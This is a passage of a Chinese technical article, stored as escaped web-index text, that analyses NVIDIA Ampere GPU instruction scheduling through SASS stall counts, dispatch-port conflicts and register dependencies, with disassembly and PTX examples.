unit\uff0c\u200b\u56e0\u6b64\u200b\u4e00\u6761\u200b Load/Store \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u53d1\u5c04\u200b\u5b8c\u6210\u200b\u3002\u200b\u56e0\u6b64\u200b\u5982\u679c\u200b\u662f\u200b\u8fde\u7eed\u200b\u7684\u200b Load/Store \u200b\u8d28\u91cf\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b Stall count \u200b\u4f1a\u200b\u662f\u200b 4\uff1a</p> <pre><code>[B------:R-:W3:-:S04]          /*0090*/                   LDG.E R8, [R2.64] ;                       /* 0x0000000402087981 */\n[B------:R-:W3:-:S04]          /*00a0*/                   LDG.E R9, [R2.64+0x4] ;                   /* 0x0000040402097981 */\n[B------:R-:W3:-:S04]          /*00b0*/                   LDG.E R10, [R2.64+0x8] ;                  /* 0x00000804020a7981 */\n[B------:R-:W3:-:S04]          /*00c0*/                   LDG.E R17, [R4.64] ;                      /* 0x0000000404117981 */\n[B------:R-:W3:-:S04]          /*00d0*/                   LDG.E R12, [R4.64+0x4] ;                  /* 0x00000404040c7981 */\n[B------:R-:W3:-:S04]          /*00e0*/                   LDG.E R13, [R6.64] ;                      /* 0x00000004060d7981 */\n[B------:R-:W3:-:S04]          /*00f0*/                   LDG.E R14, [R6.64+0x4] ;                  /* 0x00000404060e7981 */\n[B------:R-:W3:-:S01]          /*0100*/                   LDG.E R15, [R6.64+0x8] ;                  /* 0x00000804060f7981 */\n\n[B------:R-:W-:-:S04]          /*0150*/                   STG.E [R8.64], R12 ;                      /* 0x0000000c08007986 */\n[B------:R-:W-:-:S04]          /*0160*/                   STG.E [R8.64+0x4], R13 ;                  /* 0x0000040d08007986 */\n[B------:R-:W-:-:S04]          /*0170*/                   STG.E [R8.64+0x8], R14 ;                  /* 0x0000080e08007986 */\n[B------:R-:W-:-:S01]          /*0180*/                   STG.E [R8.64+0xc], R15 ;                  /* 0x00000c0f08007986 */\n</code></pre> <p>\u200b\u8fde\u7eed\u200b\u7684\u200b LDG/STG \u200b\u7684\u200b\u6700\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b Stall count \u200b\u4e0d\u200b\u7b49\u4e8e\u200b 4\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u540e\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\u4e0d\u662f\u200b Load/Store \u200b\u6307\u4ee4\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u7b49\u200b Load/Store \u200b\u6307\u4ee4\u200b\u53d1\u5c04\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u4f1a\u200b\u6324\u5360\u200b dispatch port\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u53d1\u5c04\u200b\u540e\u9762\u200b\u7684\u200b\u6307\u4ee4\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u6307\u4ee4\u200b\u6ca1\u6709\u200b\u4e92\u76f8\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u4e5f\u200b\u4e0d\u4f1a\u200b\u6324\u5360\u200b dispatch port\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u53d1\u5c04\u200b\u4e00\u6761\u200b\uff0c\u200b\u6b64\u65f6\u200b stall count \u200b\u90fd\u200b\u662f\u200b 1\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*0010*/                   MOV R4, c[0x0][0x168] ;                   /* 0x00005a0000047a02 */\n[B------:R-:W-:-:S01]          /*0020*/                   IMAD.MOV.U32 R5, RZ, RZ, c[0x0][0x16c] ;  /* 0x00005b00ff057624 */\n[B------:R-:W-:-:S01]          /*0030*/                   MOV R2, c[0x0][0x160] ;                   /* 0x0000580000027a02 */\n[B------:R-:W-:-:S01]          /*0040*/                   IMAD.MOV.U32 R3, RZ, RZ, c[0x0][0x164] ;  /* 0x00005900ff037624 */\n[B------:R-:W-:-:S01]          /*0050*/                   MOV R6, c[0x0][0x170] ;                   /* 0x00005c0000067a02 */\n[B------:R-:W-:-:S01]          /*0060*/                   IMAD.MOV.U32 R7, RZ, RZ, c[0x0][0x174] ;  /* 0x00005d00ff077624 */\n</code></pre> <p>\u200b\u867d\u7136\u200b Ampere SM 8.0 \u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 16 \u200b\u4e2a\u200b INT32 \u200b\u548c\u200b 16 \u200b\u4e2a\u200b FP 32 \u200b\u5355\u5143\u200b\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\u4e00\u6761\u200b IMAD \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u624d\u80fd\u200b\u53d1\u5c04\u200b\u5b8c\u6210\u200b\uff0c\u200b\u4f46\u662f\u200b\u4ece\u200b\u4e0a\u9762\u200b\u53ef\u4ee5\u200b\u770b\u51fa\u200b\uff0cMOV \u200b\u6307\u4ee4\u200b\u548c\u200b IMAD \u200b\u6307\u4ee4\u200b\u4f7f\u7528\u200b\u4e0d\u540c\u200b\u7684\u200b dispatch port\uff0c\u200b\u867d\u7136\u200b\u5b83\u4eec\u200b\u5404\u81ea\u200b\u90fd\u200b\u9700\u8981\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\u6765\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u662f\u200b\u95f4\u9694\u200b\u5730\u200b\u53d1\u5c04\u200b\u4f7f\u5f97\u200b\u6bcf\u4e2a\u200b\u5468\u671f\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u53d1\u5c04\u200b\u4e00\u6761\u200b\u6307\u4ee4\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC MOV dispatch port IMAD dispatch port 0 0010 0010 MOV R4 Idle 1 0020 0010 MOV R4 0020 IMAD.MOV.U32 R5 2 0030 0030 MOV R2 0020 IMAD.MOV.U32 R5 3 0040 0030 MOV R2 0040 IMAD.MOV.U32 R3 4 0050 0050 MOV R6 0040 IMAD.MOV.U32 R3 5 0060 0050 MOV R6 0060 IMAD.MOV.U32 R7 6 0070 Other insts 0060 IMAD.MOV.U32 R7 <p>\u200b\u800c\u200b\u5982\u679c\u200b\u662f\u200b\u540c\u200b\u7c7b\u578b\u200b\u7684\u200b\u8d28\u91cf\u200b\uff0c\u200b\u5c31\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u963b\u585e\u200b dispatch port\uff0c\u200b\u56e0\u6b64\u200b\u9700\u8981\u200b\u5927\u4e8e\u200b 1 \u200b\u7684\u200b stall count\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*0010*/                   IADD3 R1, R1, -0x1a0, RZ ;                                     /* 0xfffffe6001017810 */\n[B------:R-:W-:-:S01]          /*0020*/                   IMAD.MOV.U32 R2, RZ, RZ, c[0x0][0x160] ;                       /* 0x00005800ff027624 */\n[B------:R-:W-:-:S01]          /*0030*/                   ISETP.NE.AND P0, PT, RZ, c[0x0][0x160], PT ;                   /* 0x00005800ff007a0c */\n[B------:R-:W-:-:S02]          /*0040*/                   IMAD.MOV.U32 R0, RZ, RZ, c[0x0][0x18] ;                        /* 0x00000600ff007624 */\n[B------:R-:W-:-:S01]          /*0050*/                   IMAD.MOV.U32 R3, RZ, RZ, c[0x0][0x1c] ;                        /* 0x00000700ff037624 */\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b 0010 IADD3 \u200b\u548c\u200b 0020 IMAD \u200b\u4e4b\u95f4\u200b\u30010020 IMAD \u200b\u548c\u200b 0030 ISETP \u200b\u4e4b\u95f4\u200b\u30010030 ISETP \u200b\u548c\u200b 0040 IMAC \u200b\u4e4b\u95f4\u200b\u4e0d\u4f1a\u200b\u51fa\u73b0\u200b dispatch port \u200b\u7684\u200b\u51b2\u7a81\u200b\u3002\u200b\u4f46\u662f\u200b IMAD \u200b\u548c\u200b IMAD \u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u51b2\u7a81\u200b\uff0c\u200b\u6240\u4ee5\u200b 0040 IMAD \u200b\u6307\u4ee4\u200b\u7684\u200b stall count \u200b\u662f\u200b 2\u3002\u200b\u6839\u636e\u200b\u8fd9\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u731c\u6d4b\u200b\uff0cIMAD \u200b\u5e76\u200b\u6ca1\u6709\u200b\u653e\u5728\u200b INT32 core \u200b\u4e2d\u200b\u6267\u884c\u200b\uff0c\u200b\u800c\u662f\u200b\u653e\u5230\u200b\u4e86\u200b FP32 \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u6837\u200b\u6216\u8bb8\u200b\u53ef\u4ee5\u200b\u5171\u4eab\u200b\u4e58\u6cd5\u5668\u200b\uff0c\u200b\u51cf\u5c11\u200b\u9762\u79ef\u200b\u3002\u200b\u5176\u4f59\u200b\u7684\u200b MOV\uff0cIADD3 \u200b\u548c\u200b ISETP \u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u662f\u200b\u5728\u200b INT32 core \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u3002\u200b\u4e0b\u9762\u200b\u7684\u200b\u4f8b\u5b50\u200b\u4e5f\u200b\u8bf4\u660e\u200b\u4e86\u200b IADD3 \u200b\u548c\u200b ISETP \u200b\u5927\u200b\u6982\u7387\u200b\u662f\u200b\u540c\u4e00\u4e2a\u200b dispatch port\uff1a</p> <pre><code>[B------:R-:W-:-:S02]          /*0080*/                   ISETP.NE.AND P0, PT, R2, 0x1, PT ;                             /* 0x000000010200780c */\n[B------:R-:W-:Y:S04]          /*0090*/                   IADD3 R4, P1, R1, c[0x0][0x20], RZ ;                           /* 0x0000080001047a10 */\n</code></pre> <p>\u200b\u5982\u679c\u200b\u4ed4\u7ec6\u200b\u770b\u200b IMAD \u200b\u6307\u4ee4\u200b\u7684\u200b\u64cd\u4f5c\u6570\u200b\uff08<code>IMAD.MOV.U32 R2, RZ, RZ, c[0x0][0x160]</code>\uff09\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u5b83\u200b\u5b9e\u73b0\u200b\u7684\u200b\u5c31\u662f\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u200b\u884c\u4e3a\u200b\uff08<code>MOV R2, c[0x0][0x160]</code>\uff09\uff0c\u200b\u56e0\u4e3a\u200b RZ \u200b\u6052\u200b\u7b49\u4e8e\u96f6\u200b\u3002\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u7528\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u8bdd\u200b\uff0cMOV \u200b\u6307\u4ee4\u200b\u4f1a\u200b\u548c\u200b IADD3 \u200b\u6216\u200b ISETP \u200b\u6307\u4ee4\u200b\u62a2\u200b dispatch port\uff0c\u200b\u800c\u200b\u5982\u679c\u200b\u628a\u200b MOV \u200b\u6307\u4ee4\u200b\u7684\u200b\u6548\u679c\u200b\uff0c\u200b\u7528\u200b IMAD \u200b\u6307\u4ee4\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u63d0\u5347\u200b\u6027\u80fd\u200b\uff0c\u200b\u56e0\u4e3a\u200b IMAD \u200b\u6307\u4ee4\u200b\u4e0d\u4f1a\u200b\u548c\u200b IADD3 \u200b\u548c\u200b ISETP \u200b\u6307\u4ee4\u200b\u51fa\u73b0\u200b dispatch port \u200b\u51b2\u7a81\u200b\u3002IMAD \u200b\u5728\u200b\u8ba1\u7b97\u200b\u5355\u5143\u200b\u4e2d\u200b\u6267\u884c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u68c0\u67e5\u4e00\u4e0b\u200b\u64cd\u4f5c\u6570\u200b\uff0c\u200b\u5982\u679c\u200b\u8981\u200b\u5b9e\u73b0\u200b MOV \u200b\u7684\u200b\u8bed\u4e49\u200b\uff0c\u200b\u5c31\u200b\u4e0d\u7528\u200b\u542f\u7528\u200b\u4e58\u6cd5\u5668\u200b\u548c\u200b\u52a0\u6cd5\u5668\u200b\u4e86\u200b\u3002\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5982\u679c\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u9891\u7e41\u200b\u7684\u200b\u6574\u6570\u200b\u52a0\u6cd5\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u62c6\u200b\u5206\u6210\u200b IADD \u200b\u548c\u200b IMAD\uff0c\u200b\u653e\u5230\u200b\u4e24\u4e2a\u200b\u6d41\u6c34\u7ebf\u200b\u4e2d\u200b\u540c\u65f6\u200b\u8fdb\u884c\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b IMAD \u200b\u9000\u5316\u200b\u6210\u200b\u4e86\u200b \\(1 * b + c\\)\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u89c2\u5bdf\u200b\uff0c\u200b\u6765\u81ea\u200b\u4e8e\u200b GPGPU \u200b\u4e2d\u200b\u4e00\u4e9b\u200b\u95ee\u9898\u200b\u7684\u200b\u7406\u89e3\u200b\u4e0e\u200b\u601d\u8003\u200b\uff083\uff09- \u200b\u6307\u4ee4\u200b\u6267\u884c\u200b\u541e\u5410\u200b\u4e0e\u200b\u6307\u4ee4\u96c6\u200b\u8bbe\u8ba1\u200b\u3002</p> <p>\u200b\u518d\u200b\u770b\u200b\u4e0b\u9762\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\uff0c\u200b\u770b\u770b\u200b\u5982\u4f55\u200b\u7528\u200b stall count \u200b\u4fdd\u8bc1\u200b\u5199\u540e\u200b\u8bfb\u200b\uff08RAW\uff09\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u540e\u7eed\u200b\u6307\u4ee4\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u524d\u9762\u200b\u6307\u4ee4\u200b\u5199\u5165\u200b\u7684\u200b\u6b63\u786e\u200b\u7ed3\u679c\u200b\uff1a</p> <pre><code>[B------:R-:W-:-:S01]          /*01c0*/                   IMAD.X R4, RZ, RZ, c[0x0][0x54], P0 ;                          /* 0x00001500ff047624 */\n[B------:R-:W-:Y:S04]          /*01d0*/                   ISETP.GE.U32.AND P0, PT, R0, c[0x0][0x50], PT ;                /* 0x0000140000007a0c */\n[B------:R-:W-:Y:S04]          /*01e0*/                   ISETP.GE.U32.AND.EX P1, PT, R3, R4, PT, P1 ;                   /* 0x000000040300720c */\n[B------:R-:W-:-:S02]          /*01f0*/                   ISETP.GE.U32.AND.EX P3, PT, R3.reuse, c[0x0][0x54], !P1, P0 ;  /* 0x0000150003007a0c */\n[B------:R-:W-:Y:S13]          /*0200*/                   ISETP.GE.U32.AND.EX P0, PT, R3, c[0x0][0x54], !P1, P0 ;        /* 0x0000150003007a0c */\n</code></pre> <p>\u200b\u9996\u5148\u200b\u662f\u200b 01c0 \u200b\u7684\u200b IMAD \u200b\u8d28\u91cf\u200b\uff0c\u200b\u5b83\u200b\u5199\u5165\u200b R4 \u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u4f1a\u200b\u88ab\u200b 01e0 ISETP \u200b\u6307\u4ee4\u200b\u4f7f\u7528\u200b\uff0c\u200b\u6240\u4ee5\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u5199\u540e\u200b\u8bfb\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3002\u200b\u5982\u679c\u200b\u4e0d\u200b\u8003\u8651\u200b\u4f9d\u8d56\u200b\uff0c\u200b\u90a3\u4e48\u200b 01d0 ISETP \u200b\u548c\u200b 01e0 ISETP \u200b\u5e94\u8be5\u200b\u53ea\u200b\u9700\u8981\u200b\u76f8\u9694\u200b\u4e24\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u4fdd\u8bc1\u200b\u987a\u5229\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u200b\u5b9e\u9645\u4e0a\u200b 01d0 ISETP \u200b\u7684\u200b stall count \u200b\u8bbe\u7f6e\u200b\u6210\u200b\u4e86\u200b 4\u3002\u200b\u8fd9\u4f1a\u200b\u6709\u200b\u4ec0\u4e48\u200b\u6548\u679c\u200b\u5462\u200b\uff1f\u200b\u5982\u679c\u200b\u628a\u200b\u5468\u671f\u200b\u753b\u200b\u51fa\u6765\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC ISETP dispatch port IMAD dispatch port 0 01c0 Idle 01c0 IMAD.X R4 1 01d0 01d0 ISETP P0 01c0 IMAD.X R4 2 01d0 01d0 ISETP P0 Idle 3 01d0 Idle Idle 4 01d0 Idle Idle 5 01e0 01e0 ISETP P1 Idle 6 01e0 01e0 ISETP P1 Idle 7 01e0 Idle Idle 8 01e0 Idle Idle <p>\u200b\u6211\u4eec\u200b\u4e0d\u200b\u77e5\u9053\u200b IMAD.X \u200b\u6307\u4ee4\u200b\u9700\u8981\u200b\u6267\u884c\u200b\u591a\u5c11\u200b\u4e2a\u200b\u5468\u671f\u200b\uff0c\u200b\u4f46\u662f\u200b\u53ef\u4ee5\u200b\u731c\u6d4b\u200b\uff0c\u200b\u5982\u679c\u200b 01d0 ISETP \u200b\u7684\u200b stall count \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 2\uff0c\u200b\u867d\u7136\u200b 01e0 ISETP \u200b\u8d28\u91cf\u200b\u53ef\u4ee5\u200b\u63d0\u524d\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u662f\u200b\u5f53\u200b\u4ed6\u200b\u8bfb\u53d6\u200b\u5bc4\u5b58\u5668\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u80fd\u200b IMAD.X \u200b\u8fd8\u200b\u6ca1\u6709\u200b\u8ba1\u7b97\u200b\u5b8c\u6210\u200b\u5e76\u4e14\u200b\u628a\u200b\u7ed3\u679c\u200b\u5199\u200b\u56de\u5230\u200b\u5bc4\u5b58\u5668\u200b\u3002</p> <p>\u200b\u800c\u200b\u540e\u9762\u200b\u7684\u200b 01f0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b\u4e86\u200b P1 \u200b\u548c\u200b P0\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b 01d0 ISETP \u200b\u548c\u200b 01e0 ISETP \u200b\u6307\u4ee4\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4e5f\u200b\u51fa\u73b0\u200b\u4e86\u200b\u5199\u200b\u540e\u200b\u8bfb\u200b\u7684\u200b\u4f9d\u8d56\u200b\u3002\u200b\u56e0\u6b64\u200b 01e0 ISETP \u200b\u4e5f\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u6bd4\u200b 2 \u200b\u5927\u200b\u7684\u200b stall count\uff1a4\u3002\u200b\u5230\u200b 0200 ISETP \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u200b\u867d\u7136\u200b\u4e5f\u200b\u4f9d\u8d56\u200b P1 \u200b\u548c\u200b P0\uff0c\u200b\u4f46\u662f\u200b\u7531\u4e8e\u200b\u524d\u9762\u200b\u5df2\u7ecf\u200b\u7b49\u5f85\u200b\u4e86\u200b\u8db3\u591f\u200b\u7684\u200b\u5468\u671f\u200b\u6570\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u7684\u200b stall count \u200b\u4e86\u200b\uff0c\u200b\u56e0\u6b64\u200b 01f0 \u200b\u7684\u200b stall count \u200b\u5c31\u662f\u200b 2\u3002\u200b\u628a\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u5199\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u5982\u4e0b\u200b\u8868\u683c\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC ISETP dispatch port IMAD dispatch port 0 01c0 Idle 01c0 IMAD.X R4 1 01d0 01d0 ISETP P0 01c0 IMAD.X R4 2 01d0 01d0 ISETP P0 Idle 3 01d0 Idle Idle 4 01d0 Idle Idle 5 01e0 01e0 ISETP P1 Idle 6 01e0 01e0 ISETP P1 Idle 7 01e0 Idle Idle 8 01e0 Idle Idle 9 01f0 01f0 ISETP P3 Idle 10 01f0 01f0 ISETP P3 Idle 11 0200 0200 ISETP P0 Idle 12 0200 0200 ISETP P0 Idle <p>01f0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b 01e0 ISETP\uff0c\u200b\u6240\u4ee5\u200b\u53d1\u5c04\u200b\u6bd4\u200b\u5b83\u200b\u665a\u200b\u4e86\u200b 4 \u200b\u4e2a\u200b\u5468\u671f\u200b\uff1b01e0 ISETP \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b 01c0 IMAD.X\uff0c\u200b\u6240\u4ee5\u200b\u53d1\u5c04\u200b\u6bd4\u200b\u5b83\u200b\u665a\u200b\u4e86\u200b 5 \u200b\u4e2a\u200b\u5468\u671f\u200b\u3002\u200b\u8fd9\u200b\u53ef\u80fd\u200b\u610f\u5473\u7740\u200b\uff0cIMAD.X \u200b\u6307\u4ee4\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u6bd4\u200b ISETP \u200b\u8981\u200b\u591a\u200b\u4e00\u4e2a\u200b\u5468\u671f\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u6d4b\u8bd5\u200b\u8fde\u7eed\u200b\u76f8\u540c\u200b\u6307\u4ee4\u200b\u7684\u200b stall count\uff0c\u200b\u53ef\u4ee5\u200b\u6784\u9020\u200b PTX \u200b\u6307\u4ee4\u200b\u5e8f\u5217\u200b\uff1a</p> <pre><code>    mul.rn.f32  %f2, %f1, %f0;\n    mul.rn.f32  %f3, %f2, %f0;\n    mul.rn.f32  %f4, %f3, %f0;\n    mul.rn.f32  %f5, %f4, %f0;\n    mul.rn.f32  %f6, %f5, %f0;\n    mul.rn.f32  %f7, %f6, %f0;\n    mul.rn.f32  %f8, %f7, %f0;\n    mul.rn.f32  %f9, %f8, %f0;\n    mul.rn.f32  %f10, %f9, %f0;\n    mul.rn.f32  %f11, %f10, %f0;\n    mul.rn.f32  %f1, %f11, %f0;\n    mul.rn.f32  %f2, %f1, %f0;\n    mul.rn.f32  %f3, %f2, %f0;\n    mul.rn.f32  %f4, %f3, %f0;\n    mul.rn.f32  %f5, %f4, %f0;\n    mul.rn.f32  %f6, %f5, %f0;\n</code></pre> <p>\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u903c\u8feb\u200b ptxas \u200b\u751f\u6210\u200b\u8fde\u7eed\u200b\u7684\u200b FMUL \u200b\u6307\u4ee4\u200b\uff1a</p> <pre><code>[B------:R-:W-:Y:S04]          /*0050*/                   FMUL R0, R0, c[0x0][0x164] ;    /* 0x0000590000007a20 */\n[B------:R-:W-:Y:S04]          /*0060*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0070*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0080*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*0090*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n[B------:R-:W-:Y:S04]          /*00a0*/                   FMUL R0, R0, c[0x0][0x160] ;    /* 0x0000580000007a20 */\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u8fde\u7eed\u200b\u7684\u200b FMUL \u200b\u6307\u4ee4\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b stall count \u200b\u90fd\u200b\u662f\u200b 4\u3002SM 8.0 \u200b\u67b6\u6784\u200b\u6bcf\u4e2a\u200b PB \u200b\u53ea\u6709\u200b 16 \u200b\u4e2a\u200b FP32 core\u3002\u200b\u5982\u679c\u200b\u628a\u200b dispatch \u200b\u8fc7\u7a0b\u200b\u5199\u200b\u4e0b\u6765\u200b\uff0c\u200b\u5c31\u662f\u200b\uff1a</p> \u200b\u5468\u671f\u200b PC FMUL dispatch port 0 0050 0050 FMUL 1 0050 0050 FMUL 2 0060 Idle 3 0060 Idle 4 0060 0060 FMUL 5 0060 0060 FMUL <p>\u200b\u7531\u4e8e\u200b 0060 FMUL \u200b\u4f9d\u8d56\u200b 0050 FMUL \u200b\u7684\u200b\u8ba1\u7b97\u7ed3\u679c\u200b\uff0c\u200b\u8bf4\u660e\u200b\u56db\u4e2a\u200b\u5468\u671f\u200b\u5c31\u662f\u200b\u8fde\u7eed\u200b FMUL \u200b\u6307\u4ee4\u200b\u4f9d\u8d56\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u80fd\u591f\u200b\u5b9e\u73b0\u200b\u7684\u200b\u6700\u5c0f\u200b\u95f4\u9694\u200b\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u5728\u200b CUDA C Programming Guide \u200b\u5f97\u5230\u200b\u4e86\u200b\u5370\u8bc1\u200b\uff1a</p> <pre><code>If all input operands are registers, latency is caused by register dependencies,\ni.e., some of the input operands are written by some previous instruction(s)\nwhose execution has not completed yet. In this case, the latency is equal to the\nexecution time of the previous instruction and the warp schedulers must schedule\ninstructions of other warps during that time. Execution time varies depending on\nthe instruction. On devices of compute capability 7.x, for most arithmetic\ninstructions, it is typically 4 clock cycles. This means that 16 active warps\nper multiprocessor (4 cycles, 4 warp schedulers) are required to hide arithmetic\ninstruction latencies (assuming that warps execute instructions with maximum\nthroughput, otherwise fewer warps are needed). If the individual warps exhibit\ninstruction-level parallelism, i.e. have multiple independent instructions in\ntheir instruction stream, fewer warps are needed because multiple independent\ninstructions from a single warp can be issued back to back.\n</code></pre> <p>\u200b\u7f51\u7edc\u200b\u4e0a\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u67e5\u200b\u5230\u200b\u4e00\u4e9b\u200b\u6d4b\u8bd5\u200b\u6307\u4ee4\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u6587\u7ae0\u200b\uff0c\u200b\u4f8b\u5982\u200b https://arxiv.org/pdf/1905.08778.pdf \u200b\u548c\u200b https://arxiv.org/pdf/1804.06826.pdf\u3002</p>"},{"location":"hardware/gpgpu.html#dependency-barrier","title":"Dependency Barrier","text":"<p>Dependency Barrier \u200b\u4e3b\u8981\u200b\u662f\u200b\u7528\u6765\u200b\u89e3\u51b3\u200b\u4f9d\u8d56\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u8fc7\u200b\uff0cTuring \u200b\u7b49\u200b\u67b6\u6784\u200b\uff0c\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u662f\u200b\u5148\u200b\u8fdb\u5165\u200b\u5230\u200b MIO Queue\uff0c\u200b\u7136\u540e\u200b\u5230\u8fbe\u200b SM \u200b\u5171\u4eab\u200b\u7684\u200b MIO \u200b\u5355\u5143\u200b\u4e2d\u200b\uff0c\u200b\u5f53\u200b MIO \u200b\u8981\u200b\u6267\u884c\u200b\u6307\u4ee4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u624d\u200b\u4f1a\u200b\u4ece\u200b PB \u200b\u5185\u90e8\u200b\u7684\u200b\u5bc4\u5b58\u5668\u200b\u5806\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u7684\u200b\u503c\u200b\u3002\u200b\u56e0\u6b64\u200b\u8fd9\u200b\u4e00\u7c7b\u200b\u6307\u4ee4\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u5bc4\u5b58\u5668\u200b\u5ef6\u8fdf\u200b\u8bfb\u53d6\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u50cf\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6574\u6570\u200b\u6307\u4ee4\u200b\u5728\u200b\u53d1\u5c04\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5f88\u5feb\u200b\u5c31\u200b\u4f1a\u200b\u53bb\u200b\u8bfb\u53d6\u200b\u64cd\u4f5c\u6570\u200b\u3002\u200b\u90a3\u4e48\u200b\u95ee\u9898\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbf\u5b58\u200b\u6307\u4ee4\u200b\u7684\u200b\u6e90\u200b\u5bc4\u5b58\u5668\u200b\u4e0e\u200b\u5176\u4ed6\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u5bc4\u5b58\u5668\u200b\u91cd\u5408\u200b\uff0c\u200b\u51fa\u73b0\u200b\u4e86\u200b\u8bfb\u540e\u200b\u5199\u200b\uff08WAR\uff09\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u53ca\u65f6\u200b\u5199\u200b\u7684\u200b\u6307\u4ee4\u200b\u5728\u200b\u540e\u9762\u200b\u624d\u200b\u4f1a\u200b\u53d1\u5c04\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u4f9d\u7136\u200b\u53ef\u80fd\u200b\u4f1a\u